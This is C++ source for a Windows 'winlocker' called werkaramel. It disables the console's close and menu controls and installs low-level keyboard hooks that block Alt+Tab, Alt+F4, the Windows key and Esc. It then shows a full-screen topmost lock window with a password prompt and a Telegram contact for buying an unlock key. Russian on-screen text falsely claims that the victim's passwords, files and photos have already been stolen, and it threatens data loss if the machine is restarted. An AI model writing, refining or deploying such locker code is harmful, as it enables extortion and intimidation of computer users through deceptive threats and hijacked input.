// language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
// werkaramel — Death + rules + menu + winlocker with reaper, locked cmd
#include <windows.h>
#include <string>
#include <thread>
#include <chrono>
#include <random>

const std::wstring PASS = L"123";

HHOOK g_kbHook = nullptr;
HANDLE g_hOut = INVALID_HANDLE_VALUE;
HANDLE g_hIn = INVALID_HANDLE_VALUE;
HWND g_hCon = nullptr;
std::wstring g_input;
std::mt19937 g_rng(std::random_device{}());

// ── DEATH — для CMD 1 ───────────────────────────────────────
const wchar_t* DEATH[] = {
    L"888                888   888      ",
    L"888                888   888      ",
    L"888                888   888      ",
    L" .d88888 .d88b.  8888b. 88888888888b.  ",
    L"d88\" 888d8P  Y8b    \"88b888   888 \"88b ",
    L"888  88888888888.d888888888   888  888 ",
    L"Y88b 888Y8b.    888  888Y88b. 888  888 ",
    L" \"Y88888 \"Y8888 \"Y888888 \"Y888888  888 ",
};

// ── ЖНЕЦ — для WinLocker ────────────────────────────────────
const wchar_t* REAPER[] = {
    L"             ;::::;",
    L"           ;::::; :;",
    L"         ;:::::'   :;",
    L"        ;:::::;     ;.",
    L"       ,:::::'       ;           OOO\\",
    L"       ::::::;       ;          OOOOO\\",
    L"       ;:::::;       ;         OOOOOOOO",
    L"      ,;::::::;     ;'         / OOOOOOO",
    L"    ;:::::::::`. ,,,;.        /  / DOOOOOO",
    L"  .';:::::::::::::::::;,     /  /     DOOOO",
    L" ,::::::;::::::;;;;::::;,   /  /        DOOO",
    L";`::::::`'::::::;;;::::: ,#/  /          DOOO",
    L":`:::::::`;::::::;;::: ;::#  /            DOOO",
    L"::`:::::::`;:::::::: ;::::# /              DOO",
    L"`:`:::::::`;:::::: ;::::::#/               DOO",
    L" :::`:::::::`;; ;:::::::::##                OO",
    L" ::::`:::::::`;::::::::;:::#                OO",
    L" `:::::`::::::::::::;'`:;::#                O",
    L"  `:::::`::::::::;' /  / `:#",
    L"   ::::::`:::::;'  /  /   `#",
};

const std::wstring SCENE_TEXT =
    L"не пытайтесь что-то сделать сейчас. будет хуже.\n"
    L"\n"
    L"вы скачали winlocker werkaramel. это не игрушка.\n"
    L"уже поздно. всё что нужно — сделано.\n"
    L"\n"
    L"все ваши данные скопированы. пароли, файлы, фото, переписки.\n"
    L"всё это уже на нашем сервере.\n"
    L"\n"
    L"не выключайте компьютер. не трогайте диспетчер задач.\n"
    L"не пытайтесь снять задачу. система отслеживает любые действия.\n"
    L"\n"
    L"попытка закрыть это окно = немедленная блокировка.\n"
    L"попытка перезагрузить = потеря данных навсегда.\n"
    L"\n"
    L"оставайтесь на месте. дальнейшие инструкции появятся ниже.";

void WOut(const std::wstring& s) {
    DWORD w = 0;
    WriteConsoleW(g_hOut, s.c_str(), (DWORD)s.size(), &w, nullptr);
}
void SetColor(WORD attr) { SetConsoleTextAttribute(g_hOut, attr); }
void ClearScreen(WORD bg = 0) {
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    DWORD cells, w;
    COORD home = {0, 0};
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    cells = csbi.dwSize.X * csbi.dwSize.Y;
    FillConsoleOutputCharacterW(g_hOut, L' ', cells, home, &w);
    FillConsoleOutputAttribute(g_hOut, bg, cells, home, &w);
    SetConsoleCursorPosition(g_hOut, home);
}
void Gotoxy(int x, int y) {
    COORD c{ (SHORT)x, (SHORT)y };
    SetConsoleCursorPosition(g_hOut, c);
}

BOOL WINAPI CtrlHandler(DWORD type) {
    if (type == CTRL_C_EVENT || type == CTRL_CLOSE_EVENT ||
        type == CTRL_LOGOFF_EVENT || type == CTRL_SHUTDOWN_EVENT) {
        return TRUE;
    }
    return FALSE;
}

void SetupConsole() {
    CONSOLE_FONT_INFOEX cfi{};
    cfi.cbSize = sizeof(cfi);
    cfi.dwFontSize.Y = 14;
    cfi.dwFontSize.X = 7;
    wcscpy_s(cfi.FaceName, L"Consolas");
    SetCurrentConsoleFontEx(g_hOut, FALSE, &cfi);

    // убираем кнопки: закрыть, свернуть, развернуть + системное меню + рамка
    LONG style = GetWindowLong(g_hCon, GWL_STYLE);
    style &= ~(WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_SYSMENU | WS_THICKFRAME);
    SetWindowLong(g_hCon, GWL_STYLE, style);

    HMENU menu = GetSystemMenu(g_hCon, FALSE);
    if (menu) {
        DeleteMenu(menu, SC_CLOSE, MF_BYCOMMAND);
        DeleteMenu(menu, SC_MINIMIZE, MF_BYCOMMAND);
        DeleteMenu(menu, SC_MAXIMIZE, MF_BYCOMMAND);
        DeleteMenu(menu, SC_RESTORE, MF_BYCOMMAND);
    }

    SetWindowPos(g_hCon, HWND_TOPMOST, 0, 0, 0, 0,
                 SWP_FRAMECHANGED | SWP_NOMOVE | SWP_NOSIZE);

    SetConsoleCtrlHandler(CtrlHandler, TRUE);
}

LRESULT CALLBACK BlockHook(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION) {
        auto* kb = (KBDLLHOOKSTRUCT*)lp;
        DWORD vk = kb->vkCode;
        if (vk == VK_LWIN || vk == VK_RWIN) return 1;
        if (vk == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_ESCAPE) return 1;
        if (vk == VK_F11) return 1;
    }
    return CallNextHookEx(nullptr, code, wp, lp);
}

LRESULT CALLBACK BlockAllHook(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION) return 1;
    return CallNextHookEx(nullptr, code, wp, lp);
}

// ═══════════════════════════════════════════════════════════
// ФАЗА 1 — DEATH + ВАС ЗАМЕТИЛИ
// ═══════════════════════════════════════════════════════════
void PhaseRed() {
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockAllHook,
                                 GetModuleHandleW(nullptr), 0);

    ClearScreen(0);
    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);

    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int cols = csbi.srWindow.Right - csbi.srWindow.Left + 1;
    int rows = csbi.srWindow.Bottom - csbi.srWindow.Top + 1;

    int lines = sizeof(DEATH) / sizeof(DEATH[0]);
    int startY = (rows - lines - 4) / 2;
    if (startY < 1) startY = 1;

    for (int i = 0; i < lines; ++i) {
        int len = (int)wcslen(DEATH[i]);
        int x = (cols - len) / 2;
        if (x < 1) x = 1;
        Gotoxy(x, startY + i);
        WOut(DEATH[i]);
    }

    std::wstring txt = L"В А С   З А М Е Т И Л И";
    int txtY = startY + lines + 2;
    if (txtY > rows - 1) txtY = rows - 1;

    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    int tx = (cols - (int)txt.size()) / 2;
    if (tx < 1) tx = 1;
    Gotoxy(tx, txtY);
    WOut(txt);

    std::this_thread::sleep_for(std::chrono::seconds(3));

    UnhookWindowsHookEx(g_kbHook);
    g_kbHook = nullptr;
}

// ═══════════════════════════════════════════════════════════
// ФАЗА 2 — КРАСНЫЕ ПРАВИЛА
// ═══════════════════════════════════════════════════════════
void PhaseRules() {
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockAllHook,
                                 GetModuleHandleW(nullptr), 0);

    ClearScreen(0);
    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    Gotoxy(1, 1);

    int col = 1, row = 1;
    for (size_t i = 0; i < SCENE_TEXT.size(); ++i) {
        wchar_t c = SCENE_TEXT[i];
        if (c == L'\n') { col = 1; row++; Gotoxy(col, row); }
        else { WOut(std::wstring(1, c)); col++; }
        std::this_thread::sleep_for(std::chrono::milliseconds(35));
    }

    std::this_thread::sleep_for(std::chrono::seconds(5));
    UnhookWindowsHookEx(g_kbHook);
    g_kbHook = nullptr;
}

// ═══════════════════════════════════════════════════════════
// ФАЗА 3 — ЗЕЛЁНОЕ МЕНЮ
// ═══════════════════════════════════════════════════════════
void PrintMenu() {
    ClearScreen(0);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int rows = csbi.srWindow.Bottom - csbi.srWindow.Top + 1;

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Gotoxy(2, 1); WOut(L"W E R K A R A M E L");
    Gotoxy(2, 2); WOut(L"W I N L O C K E R");

    std::wstring line(40, L'=');
    Gotoxy(2, 4); WOut(line);

    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    Gotoxy(2, 6); WOut(L"Выберите действие:");

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Gotoxy(2, 8);  WOut(L"[ 1 ]   Поддержка  ->  tg @werkaramel");
    Gotoxy(2, 9);  WOut(L"[ 2 ]   Купить ключ");
    Gotoxy(2, 10); WOut(L"[ 3 ]   Выйти");

    SetColor(FOREGROUND_GREEN);
    int hintY = rows - 3; if (hintY < 12) hintY = 12;
    Gotoxy(2, hintY); WOut(L"введите число и нажмите Enter");
    Gotoxy(2, hintY + 1); WOut(L"> ");
    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    WOut(g_input);
}

void PhaseMenu() {
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockHook,
                                 GetModuleHandleW(nullptr), 0);
    PrintMenu();

    INPUT_RECORD rec;
    DWORD read = 0;
    while (true) {
        if (!ReadConsoleInputW(g_hIn, &rec, 1, &read)) {
            std::this_thread::sleep_for(std::chrono::milliseconds(50));
            continue;
        }
        if (rec.EventType != KEY_EVENT || !rec.Event.KeyEvent.bKeyDown) continue;
        wchar_t c = rec.Event.KeyEvent.uChar.UnicodeChar;
        if (c == 0) continue;

        if (c >= L'0' && c <= L'9') { g_input += c; PrintMenu(); }
        else if (c == L'\b') { if (!g_input.empty()) g_input.pop_back(); PrintMenu(); }
        else if (c == L'\r') {
            if (g_input == L"1" || g_input == L"2" || g_input == L"3") {
                UnhookWindowsHookEx(g_kbHook); g_kbHook = nullptr; return;
            } else { g_input.clear(); PrintMenu(); }
        }
    }
}

// ═══════════════════════════════════════════════════════════
// ФАЗА 4 — WINLOCKER
// ═══════════════════════════════════════════════════════════
const COLORREF W_BG = RGB(0, 0, 0);
const COLORREF W_BLOOD = RGB(150, 0, 0);
const COLORREF W_BLOOD_DK = RGB(90, 0, 0);
const COLORREF W_RED = RGB(220, 20, 20);
const COLORREF W_FG = RGB(230, 230, 230);
const COLORREF W_DIM = RGB(120, 120, 120);

std::wstring wl_input;
bool wl_wrong = false;

void DrawWLStr(HDC dc, int x, int y, const std::wstring& s, COLORREF c,
               int size, bool bold = false, bool center = false, int winW = 0) {
    HFONT font = CreateFontW(size, 0, 0, 0, bold ? FW_BOLD : FW_NORMAL,
                             FALSE, FALSE, FALSE, DEFAULT_CHARSET,
                             OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                             CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
    HFONT old = (HFONT)SelectObject(dc, font);
    SetTextColor(dc, c);
    SetBkMode(dc, TRANSPARENT);
    if (center) {
        SIZE sz;
        GetTextExtentPoint32W(dc, s.c_str(), (int)s.size(), &sz);
        x = (winW - sz.cx) / 2;
    }
    TextOutW(dc, x, y, s.c_str(), (int)s.size());
    SelectObject(dc, old);
    DeleteObject(font);
}

void DrawBigBanner(HDC dc, int x, int y, const std::wstring& s,
                   COLORREF c, int size) {
    HFONT font = CreateFontW(size, 0, 0, 0, FW_HEAVY, FALSE, FALSE, FALSE,
                             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
                             CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                             DEFAULT_PITCH, L"Impact");
    HFONT old = (HFONT)SelectObject(dc, font);
    SetBkMode(dc, TRANSPARENT);
    SetTextColor(dc, RGB(20, 0, 0));
    TextOutW(dc, x + 4, y + 4, s.c_str(), (int)s.size());
    SetTextColor(dc, c);
    TextOutW(dc, x, y, s.c_str(), (int)s.size());
    SelectObject(dc, old);
    DeleteObject(font);
}

void DrawReaperWL(HDC dc, int x, int y) {
    HFONT font = CreateFontW(12, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
                             CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                             DEFAULT_PITCH, L"Consolas");
    HFONT old = (HFONT)SelectObject(dc, font);
    SetTextColor(dc, W_BLOOD);
    SetBkMode(dc, TRANSPARENT);

    int lines = sizeof(REAPER) / sizeof(REAPER[0]);
    for (int i = 0; i < lines; ++i) {
        TextOutW(dc, x, y + i * 14, REAPER[i], (int)wcslen(REAPER[i]));
    }
    SelectObject(dc, old);
    DeleteObject(font);
}

void WLPaint(HWND hwnd) {
    PAINTSTRUCT ps;
    HDC dc = BeginPaint(hwnd, &ps);
    RECT rc; GetClientRect(hwnd, &rc);

    HBRUSH bg = CreateSolidBrush(W_BG);
    FillRect(dc, &rc, bg);
    DeleteObject(bg);

    int sw = rc.right;

    DrawReaperWL(dc, 60, 100);

    int bx = sw / 2 + 60;
    DrawBigBanner(dc, bx, 100, L"WERKARAMEL", W_BLOOD, 60);

    DrawWLStr(dc, bx, 185, L"W I N L O C K E R", W_BLOOD_DK, 22);

    HPEN pen = CreatePen(PS_SOLID, 2, W_BLOOD);
    HPEN op = (HPEN)SelectObject(dc, pen);
    MoveToEx(dc, bx, 225, nullptr);
    LineTo(dc, sw - 60, 225);
    SelectObject(dc, op);
    DeleteObject(pen);

    DrawWLStr(dc, bx, 245, L"SYSTEM LOCKED", W_RED, 50, true);
    DrawWLStr(dc, bx, 320, L"введите пароль:", W_FG, 20);
    DrawWLStr(dc, bx, 345, L"tg: @werkaramel", W_BLOOD, 20);

    int boxX = bx, boxY = 390;
    int boxW = sw - bx - 60;
    if (boxW > 600) boxW = 600;
    int boxH = 60;

    RECT box{ boxX, boxY, boxX + boxW, boxY + boxH };
    HBRUSH bf = CreateSolidBrush(RGB(20, 0, 0));
    FillRect(dc, &box, bf);
    DeleteObject(bf);

    HPEN bp = CreatePen(PS_SOLID, 2, W_BLOOD);
    HPEN obp = (HPEN)SelectObject(dc, bp);
    HBRUSH obb = (HBRUSH)SelectObject(dc, GetStockObject(NULL_BRUSH));
    Rectangle(dc, boxX, boxY, boxX + boxW, boxY + boxH);
    SelectObject(dc, obp);
    SelectObject(dc, obb);
    DeleteObject(bp);

    std::wstring masked(wl_input.size(), L'*');
    DrawWLStr(dc, boxX + 20, boxY + 16, masked, W_FG, 32);

    if (wl_wrong) {
        DrawWLStr(dc, bx, boxY + boxH + 20, L"НЕВЕРНЫЙ ПАРОЛЬ", W_RED, 24, true);
    } else {
        DrawWLStr(dc, bx, boxY + boxH + 20, L"[ Enter ] разблокировать", W_DIM, 20);
    }

    EndPaint(hwnd, &ps);
}

LRESULT CALLBACK WLProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_PAINT: WLPaint(hwnd); return 0;
    case WM_KEYDOWN:
        if (wp == VK_F4 && (GetKeyState(VK_MENU) & 0x8000)) return 0;
        if (wp == VK_ESCAPE) return 0;
        return 0;
    case WM_SYSCOMMAND:
        if ((wp & 0xFFF0) == SC_CLOSE) return 0;
        if ((wp & 0xFFF0) == SC_MINIMIZE) return 0;
        if ((wp & 0xFFF0) == SC_KEYMENU) return 0;
        return 0;
    case WM_CLOSE: return 0;
    case WM_CHAR:
        if (wp == VK_BACK) {
            if (!wl_input.empty()) wl_input.pop_back();
            wl_wrong = false;
        } else if (wp == VK_RETURN) {
            if (wl_input == PASS) {
                UnhookWindowsHookEx(g_kbHook);
                PostQuitMessage(0);
            } else {
                wl_input.clear();
                wl_wrong = true;
                MessageBeep(MB_ICONHAND);
            }
        } else if (wp >= 32) {
            wl_input.push_back((wchar_t)wp);
            wl_wrong = false;
        }
        InvalidateRect(hwnd, nullptr, FALSE);
        return 0;
    case WM_DESTROY:
        UnhookWindowsHookEx(g_kbHook);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

void PhaseLocker() {
    ShowWindow(g_hCon, SW_HIDE);

    WNDCLASSW wc{};
    wc.lpfnWndProc = WLProc;
    wc.hInstance = GetModuleHandleW(nullptr);
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"werka_locker";
    RegisterClassW(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST, L"werka_locker", L"System Locked",
        WS_POPUP, 0, 0, sw, sh, nullptr, nullptr,
        GetModuleHandleW(nullptr), nullptr);

    ShowWindow(hwnd, SW_SHOWMAXIMIZED);
    SetForegroundWindow(hwnd);
    SetFocus(hwnd);

    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockHook,
                                 GetModuleHandleW(nullptr), 0);

    MSG m;
    while (GetMessageW(&m, nullptr, 0, 0)) {
        TranslateMessage(&m);
        DispatchMessageW(&m);
    }
}

int wmain() {
    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    g_hIn = GetStdHandle(STD_INPUT_HANDLE);
    g_hCon = GetConsoleWindow();
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);

    DWORD mode = 0;
    GetConsoleMode(g_hIn, &mode);
    SetConsoleMode(g_hIn, mode | ENABLE_ECHO_INPUT | ENABLE_LINE_INPUT | ENABLE_PROCESSED_INPUT);

    SetupConsole();

    PhaseRed();
    PhaseRules();
    PhaseMenu();
    PhaseLocker();

    return 0;
}
